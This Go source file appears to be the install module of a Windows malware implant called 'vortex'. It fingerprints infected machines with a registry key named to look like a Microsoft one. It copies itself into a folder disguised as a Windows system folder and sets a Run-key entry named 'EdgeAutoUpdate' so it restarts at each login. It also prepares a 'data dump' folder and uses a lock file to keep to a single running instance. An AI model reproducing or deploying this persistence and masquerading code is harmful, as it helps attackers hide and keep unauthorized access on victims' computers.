//go:build windows

package install

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"vortex/hutil"

	"golang.org/x/sys/windows/registry"
)

var (
	FingerprintRK string = "UserUpdate"
	persistRK     string = "EdgeAutoUpdate"
	dataPath      string = filepath.Join(os.Getenv("LOCALAPPDATA"), "Program Files")
	persistPath   string = filepath.Join(os.Getenv("APPDATA"), "Microsoft\\Windows\\Program Data")
)

// Check if the software has been fingerprinted the device
func CheckDeviceFingerprint() bool {
	chkFingerprint, err := registry.OpenKey(registry.CURRENT_USER, "Software\\Microsoft\\"+FingerprintRK, registry.ENUMERATE_SUB_KEYS)
	if err == registry.ErrNotExist {
		return false
	}
	defer chkFingerprint.Close()

	return true
}

// Place a fingerprint to the new device
func FingerprintDevice() error {
	createFPKey, err := registry.OpenKey(registry.CURRENT_USER, "Software\\Microsoft", registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer createFPKey.Close()

	if _, _, err = registry.CreateKey(createFPKey, FingerprintRK, registry.CREATE_SUB_KEY); err != nil {
		return err
	}

	return nil
}

// Maintain Access to the device
func InstallPersistence() error {
	exePath := filepath.Join(persistPath, filepath.Base(os.Args[0]))
	regPath := "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

	if _, err := os.Stat(persistPath); os.IsNotExist(err) {
		if err = os.Mkdir(persistPath, os.ModePerm); err != nil {
			return err
		}
	}

	if err := hutil.CopyFile(os.Args[0], exePath); err != nil {
		return err
	}

	//runPersist, _, err := registry.CreateKey(registry.LOCAL_MACHINE, regPath, registry.SET_VALUE)
	//if err != nil {
	runPersist, _, err := registry.CreateKey(registry.CURRENT_USER, regPath, registry.SET_VALUE)

	if err = runPersist.SetStringValue(persistRK, exePath); err != nil {
		return err
	}
	defer runPersist.Close()

	return nil
}

// Uninstall current persistence, Used for implant upgrades
func UninstallPersistence() {
	regPath := "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
	persistKeyUser, _ := registry.OpenKey(registry.CURRENT_USER, regPath, registry.WRITE)
	persistKeyMachine, _ := registry.OpenKey(registry.LOCAL_MACHINE, regPath, registry.WRITE)
	defer persistKeyUser.Close()
	defer persistKeyMachine.Close()

	persistKeyUser.DeleteValue(persistRK)
	persistKeyMachine.DeleteValue(persistRK)
}

// Double check the folder existence
func DataDumpLocation() string {
	if _, err := os.Stat(dataPath); os.IsNotExist(err) {
		if err = os.Mkdir(dataPath, os.ModePerm); err != nil {
			return ""
		}
	}

	return dataPath
}

// Process Lock to prevent implant from running multiple times and avoid spamming
func ProcessLock() bool {
	lockFile := filepath.Join(persistPath, "LOCK")
	procId, _ := hutil.GetProcessIdByName(filepath.Base(os.Args[0]))

	if _, err := os.Stat(lockFile); os.IsNotExist(err) {
		file, _ := os.Create(lockFile)
		file.WriteString(fmt.Sprint(procId))
		return false
	} else {
		oldId, _ := os.ReadFile(lockFile)
		if !strings.Contains(fmt.Sprint(procId), string(oldId)) {
			ProcessUnlock()
			file, _ := os.Create(lockFile)
			file.WriteString(string(oldId))
			return false
		}
	}

	return true
}

// Unlock process to be used as a seperated function
func ProcessUnlock() {
	os.Remove(filepath.Join(persistPath, "LOCK"))
}
